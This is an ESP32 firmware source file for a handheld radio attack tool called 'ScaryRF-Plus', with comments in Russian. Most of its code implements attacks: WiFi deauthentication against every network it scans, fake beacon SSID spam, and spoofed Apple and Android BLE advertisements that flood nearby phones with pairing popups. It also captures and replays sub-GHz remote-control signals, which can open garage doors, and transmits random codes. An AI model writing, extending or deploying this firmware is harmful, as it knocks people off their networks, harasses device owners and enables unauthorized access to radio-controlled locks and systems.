#include <U8g2lib.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>

// Bluetooth
#include <NimBLEDevice.h>
NimBLEAdvertising *pAdvertising;
// BLE END

// WiFi attacks
#include "deauth.h"
#include "wifispam.h"
// WiFi END

#ifdef U8X8_HAVE_HW_I2C
#include <Wire.h>
#endif

#define RX_PIN 4
#define TX_PIN 2
#define BUTTON_OK 33   // ОК
#define BUTTON_EXIT 32 // Вверх
#define BUTTON_DOWN 26 // Вниз
#define BUTTON_UP 27   // Назад
#define FREQUENCY_SWITCH_PIN 13
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2(U8G2_R2, /* reset=*/ U8X8_PIN_NONE);

#include "logo.h"

RCSwitch mySwitch = RCSwitch();

unsigned long receivedValue = 0;
int receivedBitLength = 0;
int receivedProtocol = 0;
const int rssi_threshold = -75;

static const uint32_t subghz_frequency_list[] = {
  300000000, 303875000, 304250000, 310000000, 315000000, 318000000,
  390000000, 418000000, 433075000, 433420000, 433920000, 434420000, 434775000, 438900000,
  868350000, 915000000, 925000000
};

#define WAVEFORM_SAMPLES 128
int waveform[WAVEFORM_SAMPLES] = {0};
int waveformIndex = 0;

// Variable to disable WiFi during BLE
bool disableWiFiDuringBLE = true;

// ---------------------МЕНЮ--------------------- //
struct menu_entry_type {
  const uint8_t *font;
  uint16_t icon;
  const char *name;
  const menu_entry_type *menu;
};

struct menu_state {
  uint8_t position;
  const menu_entry_type *menu;
};

#define ICON_WIDTH 32
#define ICON_HEIGHT 32
#define ICON_GAP 4
#define ICON_BGAP 16
#define ICON_Y 32 + ICON_GAP

// ---------------------SubGHz--------------------- //
const menu_entry_type SubGHz_menu[] = {
  { u8g2_font_open_iconic_all_4x_t, 211, "Replay", NULL },
  { u8g2_font_open_iconic_all_4x_t, 238, "Spectrum", NULL },
  { u8g2_font_open_iconic_all_4x_t, 165, "Analyser", NULL },
  { u8g2_font_open_iconic_all_4x_t, 240, "Random", NULL },
  { NULL, 0, NULL, NULL }
};

// ---------------------Wifi--------------------- //
const menu_entry_type wifi_menu[] = {
  { u8g2_font_open_iconic_all_4x_t, 104, "Evil portal", NULL },
  { u8g2_font_open_iconic_all_4x_t, 153, "Deauther", NULL },
  { u8g2_font_open_iconic_all_4x_t, 175, "Spam", NULL },
  { NULL, 0, NULL, NULL }
};

// ---------------------Bluetooth--------------------- //
const menu_entry_type bluetooth_menu[] = {
  { u8g2_font_open_iconic_all_4x_t, 230, "BLE Spam", NULL },
  { NULL, 0, NULL, NULL }
};

// ---------------------ГЛАВНОЕ МЕНЮ--------------------- //
const menu_entry_type menu_entry_list[] = {
  { u8g2_font_open_iconic_all_4x_t, 84, "SubGHz", SubGHz_menu },
  { u8g2_font_open_iconic_all_4x_t, 247, "Wifi", wifi_menu },
  { u8g2_font_open_iconic_all_4x_t, 94, "Bluetooth", bluetooth_menu },
  { u8g2_font_open_iconic_all_4x_t, 129, "Config", NULL },
  { NULL, 0, NULL, NULL }
};

bool in_menu = true;

// ---------------------ФУНКЦИИ ОТРИСОВКИ МЕНЮ--------------------- //
void draw_menu(struct menu_state *state) {
  int16_t x = (u8g2.getDisplayWidth() - ICON_WIDTH) / 2;
  uint8_t i = state->position;

  u8g2.setFlipMode(3); // Ротация экрана
  u8g2.clearBuffer();

  // Отрисовка текущей иконки
  u8g2.setFont(state->menu[i].font);
  u8g2.drawGlyph(x, ICON_Y, state->menu[i].icon);

  // Рамка вокруг текущей иконки
  u8g2.drawFrame(x - 1, ICON_Y - ICON_HEIGHT - 1, ICON_WIDTH + 2, ICON_HEIGHT + 2);
  u8g2.drawFrame(x - 2, ICON_Y - ICON_HEIGHT - 2, ICON_WIDTH + 4, ICON_HEIGHT + 4);
  u8g2.drawFrame(x - 3, ICON_Y - ICON_HEIGHT - 3, ICON_WIDTH + 6, ICON_HEIGHT + 6);

  // Название текущего пункта меню
  u8g2.setFont(u8g2_font_6x10_tf);
  u8g2.setCursor((u8g2.getDisplayWidth() - u8g2.getStrWidth(state->menu[i].name)) / 2, u8g2.getDisplayHeight() - 5);
  u8g2.print(state->menu[i].name);

  u8g2.sendBuffer();
}

void to_right(struct menu_state *state) {
  if (state->menu[state->position + 1].font != NULL) {
    state->position++;
  }
}

void to_left(struct menu_state *state) {
  if (state->position > 0) {
    state->position--;
  }
}

struct menu_state current_state = { 0, menu_entry_list };

// ---------------------WiFi ФУНКЦИИ--------------------- //
void WiFiSpam() {
  Serial.println("[WiFi] Запуск WiFi спама...");
  u8g2.clearBuffer();
  u8g2.setCursor(0, 10);
  u8g2.print(" WiFi Spam...");
  u8g2.setCursor(0, 20);
  u8g2.print(" Press * to stop");
  u8g2.sendBuffer();

  WiFi.mode(WIFI_OFF);
  WiFi.mode(WIFI_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_get_mac(WIFI_IF_STA, macAddr);

  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  while (digitalRead(BUTTON_EXIT) != LOW) {
    if (spamtype == 1) {
      beaconSpamList(funnyssids);
    } else {
      beaconSpamList(rickrollssids);
    }
    delay(1);
  }

  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  Serial.println("[WiFi] WiFi спам остановлен");
}

void WiFiDeauth() {
  Serial.println("[WiFi] Запуск деаутентификации...");
  u8g2.clearBuffer();
  u8g2.setCursor(0, 10);
  u8g2.print(" WiFi Deauth...");
  u8g2.setCursor(0, 20);
  u8g2.print(" Scanning networks...");
  u8g2.sendBuffer();

  WiFi.mode(WIFI_STA);
  esp_wifi_start();

  int16_t numNetworks = WiFi.scanNetworks();
  if (numNetworks <= 0) {
    Serial.println("[WiFi] Сети не найдены");
    u8g2.clearBuffer();
    u8g2.setCursor(0, 10);
    u8g2.print(" No networks found");
    u8g2.sendBuffer();
    delay(2000);
    return;
  }

  Serial.printf("[WiFi] Найдено %d сетей\n", numNetworks);
  u8g2.clearBuffer();
  u8g2.setCursor(0, 10);
  u8g2.print(" Deauth attack...");
  u8g2.setCursor(0, 20);
  u8g2.print(" Press * to stop");
  u8g2.sendBuffer();

  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

  while (digitalRead(BUTTON_EXIT) != LOW) {
    for (int i = 0; i < numNetworks; i++) {
      wifi_ap_record_t ap_record;
      memcpy(&ap_record, WiFi.getScanInfoByIndex(i), sizeof(wifi_ap_record_t));
      
      wsl_bypasser_send_deauth_frame(&ap_record, ap_record.primary);
      
      if (digitalRead(BUTTON_EXIT) == LOW) break;
      delay(100);
    }
  }

  WiFi.mode(WIFI_OFF);
  Serial.println("[WiFi] Деаутентификация остановлена");
}

// ---------------------НАСТРОЙКА УСТРОЙСТВА--------------------- //
void setup() {
  Serial.begin(115200);
  Serial.println("[SYSTEM] Инициализация ScaryRF...");

  pinMode(BUTTON_OK, INPUT_PULLUP);
  pinMode(FREQUENCY_SWITCH_PIN, INPUT_PULLUP);
  pinMode(BUTTON_EXIT, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_UP, INPUT_PULLUP);

  u8g2.begin();
  u8g2.enableUTF8Print();
  ELECHOUSE_cc1101.Init();

  u8g2.begin();
  u8g2.clearBuffer();
  u8g2.setFlipMode(3);
  u8g2.setFont(u8g2_font_6x10_tf);

  // Логотип
  u8g2.firstPage();
  do {
    u8g2.drawXBMP(0, 0, scary_width, scary_height, scary_bits);
  } while (u8g2.nextPage());
  
  while (digitalRead(BUTTON_DOWN) != LOW && digitalRead(BUTTON_OK) != LOW && digitalRead(BUTTON_UP) != LOW && digitalRead(BUTTON_EXIT) != LOW) {
    // Нажатие для выхода из заставки
  }

  // Установка частоты
  if (digitalRead(FREQUENCY_SWITCH_PIN) == LOW) {
    ELECHOUSE_cc1101.setMHZ(315);
    Serial.println("[RF] Частота установлена на 315MHz");
  } else {
    ELECHOUSE_cc1101.setMHZ(433.92);
    Serial.println("[RF] Частота установлена на 433.92MHz");
  }

  ELECHOUSE_cc1101.SetRx();
  Serial.println("[RF] Режим приема включен");

  mySwitch.enableReceive(RX_PIN);
  mySwitch.enableTransmit(TX_PIN);
  Serial.println("[RF] Инициализация RCSwitch завершена");

  Blesetup();
  Serial.println("[BLE] Инициализация Bluetooth завершена");
  Serial.println("[SYSTEM] Готов к работе");
}

// ---------------------ОСНОВНОЙ ЦИКЛ--------------------- //
void loop() {
  int8_t event = 0;

  if (digitalRead(BUTTON_DOWN) == LOW) {
    event = 1; // U8X8_MSG_GPIO_MENU_NEXT
  } else if (digitalRead(BUTTON_UP) == LOW) {
    event = 2; // U8X8_MSG_GPIO_MENU_PREV
  } else if (digitalRead(BUTTON_OK) == LOW) {
    event = 3; // U8X8_MSG_GPIO_MENU_SELECT
  } else if (digitalRead(BUTTON_EXIT) == LOW) {
    event = 4; // Возврат в главное меню
  }

  if (in_menu) {
    if (event == 1) {
      to_right(&current_state);
    }
    if (event == 2) {
      to_left(&current_state);
    }
    if (event == 3) {
      if (current_state.menu[current_state.position].menu != NULL) {
        current_state.menu = current_state.menu[current_state.position].menu;
        current_state.position = 0;
      } else {
        if (strcmp(current_state.menu[current_state.position].name, "Replay") == 0) {
          Serial.println("[SubGHz] Запуск режима Replay");
          Detect();
        }
        if (strcmp(current_state.menu[current_state.position].name, "Spectrum") == 0) {
          Serial.println("[SubGHz] Запуск режима Spectrum");
          while (digitalRead(BUTTON_EXIT) != LOW) {
            Spectrum();
          }
        }
        if (strcmp(current_state.menu[current_state.position].name, "Analyser") == 0) {
          Serial.println("[SubGHz] Запуск анализатора");
          while (digitalRead(BUTTON_EXIT) != LOW) {
            Analyser();     
          }
        }
        if (strcmp(current_state.menu[current_state.position].name, "Random") == 0) {
          Serial.println("[SubGHz] Запуск случайных сигналов");
          while (digitalRead(BUTTON_EXIT) != LOW) {
            if (digitalRead(BUTTON_OK) == LOW) {
              SendRandom();
            }
          }
        }
        if (strcmp(current_state.menu[current_state.position].name, "Evil portal") == 0) {
          Serial.println("[WiFi] Evil portal (в разработке)");
          u8g2.clearBuffer();
          u8g2.setCursor(0, 10);
          u8g2.print(" In progress...");
          u8g2.sendBuffer();
        }
        if (strcmp(current_state.menu[current_state.position].name, "Deauther") == 0) {
          WiFiDeauth();
        }
        if (strcmp(current_state.menu[current_state.position].name, "Spam") == 0) {
          WiFiSpam();
        }
        if (strcmp(current_state.menu[current_state.position].name, "BLE Spam") == 0) {
          Serial.println("[BLE] Запуск BLE спама");
          while (digitalRead(BUTTON_EXIT) != LOW) {                      
            Bleloop();
          }
          // Restore WiFi state after BLE spam
          if (disableWiFiDuringBLE) {
            Serial.println("[WiFi] Восстановление WiFi после BLE");
            WiFi.mode(WIFI_OFF); // Ensure WiFi remains off unless needed
          }
          Serial.println("[BLE] BLE спам остановлен");
        }
        if (strcmp(current_state.menu[current_state.position].name, "Config") == 0) {
          Serial.println("[SYSTEM] Config selected");
          u8g2.clearBuffer();
          u8g2.setCursor(0, 20);
          u8g2.print(" ScaryRF-Plus v1.1");
          u8g2.setCursor(0, 40);
          u8g2.print(" by Teapot174");
          u8g2.sendBuffer();
          
          // Ждем нажатия * для выхода
          while (digitalRead(BUTTON_EXIT) != LOW) {
            delay(10);
          }
          return;
        }
      }
    }

    if (event == 4 && current_state.menu != menu_entry_list) {
      Serial.println("[MENU] Возврат в главное меню");
      current_state.menu = menu_entry_list;
      current_state.position = 0;
      in_menu = true;
      delay(100);
    }

    if (in_menu) {
      draw_menu(&current_state);
    }

    delay(100); // Задержка
  }
}

// ---------------------SubGHz ФУНКЦИИ--------------------- //
void Detect() {
  Serial.println("[SubGHz] Ожидание сигнала...");
  while (digitalRead(BUTTON_EXIT) != LOW) {
    if (receivedBitLength == 0 ) {
      u8g2.clearBuffer();
      u8g2.setCursor(0, 10);
      u8g2.print(" Waiting Signal...");
      u8g2.sendBuffer();
    }
    if (mySwitch.available()) {
      receivedValue = mySwitch.getReceivedValue();
      receivedBitLength = mySwitch.getReceivedBitlength();
      unsigned int* rawSignal = mySwitch.getReceivedRawdata();
      receivedProtocol = mySwitch.getReceivedProtocol();

      if (receivedValue != 0) {
        Serial.printf("[SubGHz] Получен сигнал: %lu, бит: %d, протокол: %d\n", receivedValue, receivedBitLength, receivedProtocol);
        u8g2.clearBuffer();
        u8g2.setCursor(0, 10);
        u8g2.print(" Received Signal:");
        u8g2.setCursor(0, 20);
        u8g2.print(receivedValue);
        u8g2.setCursor(0, 30);
        u8g2.printf(" Bit:%d  Ptc:%d", receivedBitLength, receivedProtocol);
        u8g2.sendBuffer();

        mySwitch.resetAvailable();
      }
    }

    if (digitalRead(BUTTON_OK) == LOW && receivedValue != 0) {
      Serial.println("[SubGHz] Повтор сигнала...");
      mySwitch.disableReceive();
      delay(100);
      mySwitch.enableTransmit(TX_PIN);
      ELECHOUSE_cc1101.SetTx();

      u8g2.clearBuffer();
      u8g2.setCursor(0, 10);
      u8g2.print(" Received Signal:");
      u8g2.setCursor(0, 20);
      u8g2.print(receivedValue);
      u8g2.setCursor(0, 30);
      u8g2.print(" Sending...");
      u8g2.sendBuffer();

      mySwitch.setProtocol(receivedProtocol);
      mySwitch.send(receivedValue, receivedBitLength);

      delay(500);

      u8g2.clearBuffer();
      u8g2.setCursor(0, 10);
      u8g2.print(" Received Signal:");
      u8g2.setCursor(0, 20);
      u8g2.print(receivedValue);
      u8g2.setCursor(0, 30);
      u8g2.print(" OK");
      u8g2.sendBuffer();

      ELECHOUSE_cc1101.SetRx();
      mySwitch.disableTransmit();
      delay(100);
      mySwitch.enableReceive(RX_PIN);
      Serial.println("[SubGHz] Сигнал отправлен");
    }

    if (digitalRead(FREQUENCY_SWITCH_PIN) == LOW) {
      ELECHOUSE_cc1101.setMHZ(315);
    } else {
      ELECHOUSE_cc1101.setMHZ(433.92);
    }
  }
  Serial.println("[SubGHz] Выход из режима Replay");
}

void Spectrum() {
  if (digitalRead(BUTTON_OK) == LOW) {
    Serial.println("[SubGHz] Запуск Spectrum");
    u8g2.clearBuffer();
    float mhz = 0;

    for (int i = 1; i < SCREEN_WIDTH; i++) {
      int rssi = ELECHOUSE_cc1101.getRssi();
      waveform[i] = map(rssi, -100, -40, 0, 1023);

      if (rssi < -75) {
        if (i % 2 == 0) {
          ELECHOUSE_cc1101.setMHZ(433.92);
          ELECHOUSE_cc1101.SetRx();
          mhz = 433.92;
        } else {
          ELECHOUSE_cc1101.setMHZ(315);
          ELECHOUSE_cc1101.SetRx();
          mhz = 315.00;
        }
      } else {
        u8g2.setCursor(0, 7);
        u8g2.print(mhz);
      }

      int prevY = map(waveform[i - 1], 0, 1023, SCREEN_HEIGHT - 13, 8);
      int currY = map(waveform[i], 0, 1023, SCREEN_HEIGHT - 13, 8);
      u8g2.drawLine(i - 1, prevY, i, currY);

      u8g2.sendBuffer();
      delay(30);

      if (i == SCREEN_WIDTH && mhz != 0) {
        u8g2.clearBuffer();
        u8g2.setCursor(0, 7);
        u8g2.print(mhz);
        i = 1;
      }

      if (digitalRead(BUTTON_OK) != LOW) {
        break;
      }
    }

    delay(500);
    Serial.println("[SubGHz] Выход из Spectrum режима");
  }
}

void Analyser() {
  Serial.println("[SubGHz] Запуск анализатора частот");
  u8g2.clearBuffer();
  u8g2.setCursor(0, 20);
  u8g2.printf(" Analyzing...");
  u8g2.sendBuffer();

  while (digitalRead(BUTTON_EXIT) != LOW) {
    int rssi;
    uint32_t detectedFrequency = 0;
    int detectedRssi = -100;

    for (size_t i = 0; i < sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]); i++) {
      uint32_t frequency = subghz_frequency_list[i];
      
      if (digitalRead(BUTTON_EXIT) == LOW) {
        break;
      }

      ELECHOUSE_cc1101.setMHZ((float)frequency / 1000000.0);
      ELECHOUSE_cc1101.SetRx();
      delayMicroseconds(3500);
      rssi = ELECHOUSE_cc1101.getRssi();

      if (rssi >= rssi_threshold && rssi > detectedRssi) {
        detectedRssi = rssi;
        detectedFrequency = frequency;
      }     
    }

    if (detectedFrequency != 0) {
      Serial.printf("[SubGHz] Обнаружен сигнал: %.2fMHz, RSSI: %ddBm\n", (float)detectedFrequency / 1000000.0, detectedRssi);
      u8g2.clearBuffer();
      u8g2.setCursor(0, 10);
      u8g2.printf(" Signal detected:");
      u8g2.setCursor(0, 20);
      u8g2.printf(" Frequency:%.2fMHz", (float)detectedFrequency / 1000000.0);
      u8g2.setCursor(0, 30);
      u8g2.printf(" RSSI:%ddBm", detectedRssi);
      u8g2.sendBuffer();
      detectedFrequency = 0;
    }

    delay(600);
  }
  ELECHOUSE_cc1101.SetRx();
  mySwitch.disableTransmit();
  delay(100);
  mySwitch.enableReceive(RX_PIN);
  Serial.println("[SubGHz] Выход из анализатора");
}

void SendRandom() {
  Serial.println("[SubGHz] Отправка случайного сигнала");
  if (digitalRead(FREQUENCY_SWITCH_PIN) == LOW) {
    ELECHOUSE_cc1101.setMHZ(315);
  } else {
    ELECHOUSE_cc1101.setMHZ(433.92);
  }

  u8g2.clearBuffer();
  u8g2.setCursor(0, 10);
  u8g2.print(" Sending Random:");
  u8g2.sendBuffer();
  delay(100);

  unsigned long randomValue = 100000000 + random(900000000);
  int randomBitLength = 28;
  int randomProtocol = 6;

  if (digitalRead(FREQUENCY_SWITCH_PIN) == LOW) {
    randomBitLength = 24;
    randomProtocol = 1;
  }

  mySwitch.disableReceive();
  delay(100);
  mySwitch.enableTransmit(TX_PIN);
  ELECHOUSE_cc1101.SetTx();

  u8g2.clearBuffer();
  u8g2.setCursor(0, 10);
  u8g2.print(" Sending Random:");
  u8g2.setCursor(0, 20);
  u8g2.print(randomValue);
  u8g2.setCursor(0, 30);
  u8g2.print(" Sending...");
  u8g2.sendBuffer();

  mySwitch.setProtocol(randomProtocol);
  mySwitch.send(randomValue, randomBitLength);

  delay(100);

  u8g2.clearBuffer();
  u8g2.setCursor(0, 10);
  u8g2.print(" Sending Random:");
  u8g2.setCursor(0, 20);
  u8g2.print(randomValue);
  u8g2.setCursor(0, 30);
  u8g2.print(" OK");
  u8g2.sendBuffer();

  ELECHOUSE_cc1101.SetRx();
  mySwitch.disableTransmit();
  delay(100);
  mySwitch.enableReceive(RX_PIN);
  Serial.printf("[SubGHz] Отправлен случайный сигнал: %lu, бит: %d, протокол: %d\n", randomValue, randomBitLength, randomProtocol);
}

// ---------------------BLE ФУНКЦИИ--------------------- //
#include "blespam.h"

int i = 1;

void Blesetup() {
  if (disableWiFiDuringBLE) {
    Serial.println("[WiFi] Отключение WiFi для BLE");
    WiFi.mode(WIFI_OFF);
  }
  NimBLEDevice::init("");
  // ... настройка мощности
  NimBLEServer* pServer = NimBLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
}

BLEAdvertisementData getAppleAdvertisement() {
  uint8_t* devices[] = {Airpods, AirpodsPro, AirpodsMax, AirpodsGen2, AirpodsGen3, AirpodsProGen2, PowerBeats, PowerBeatsPro, BeatsSoloPro, BeatsStudioBuds, BeatsFlex, BeatsX, BeatsSolo3, BeatsStudio3, BeatsStudioPro, BeatsFitPro, BeatsStudioBudsPlus, AppleTVSetup, AppleTVPair, AppleTVNewUser, AppleTVAppleIDSetup, AppleTVWirelessAudioSync, AppleTVHomekitSetup, AppleTVKeyboard, AppleTVConnectingToNetwork, HomepodSetup, SetupNewPhone, TransferNumber, TVColorBalance, AppleVisionPro};
  uint8_t* data = devices[rand() % (sizeof(devices)/sizeof(devices[0]))];
  BLEAdvertisementData adv;
  // Use setManufacturerData for Apple advertisement packets
  adv.setManufacturerData(std::string((char*)data, data[0] + 1));
  return adv;
}

BLEAdvertisementData getAndroidAdvertisement() {
  DeviceType model = android_models[rand() % android_models_count];
  uint8_t packet[7] = {
    0x06, 0xFF, 0xE0, 0x00, // Заголовок (Google)
    (uint8_t)(model.value >> 16), (uint8_t)(model.value >> 8), (uint8_t)model.value
  };
  BLEAdvertisementData adv;
  // Use setManufacturerData instead of addData for Android advertisement packets
  adv.setManufacturerData(std::string((char*)packet, sizeof(packet)));
  return adv;
}

void Bleloop() {
  if (disableWiFiDuringBLE) {
    WiFi.mode(WIFI_OFF); // Ensure WiFi is off during BLE loop
  }
  delay(200);
  
  // Рандомный выбор платформы
  bool isApple = rand() % 2;
  BLEAdvertisementData advData = isApple ? getAppleAdvertisement() : getAndroidAdvertisement();
  pAdvertising->setAdvertisementData(advData);

  // Обновление дисплея
  u8g2.clearBuffer();
  u8g2.setCursor(0, 10);
  u8g2.print(isApple ? " iOS" : " Android");
  u8g2.print("-Spam #"); 
  u8g2.print(i++);
  u8g2.sendBuffer();

  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}
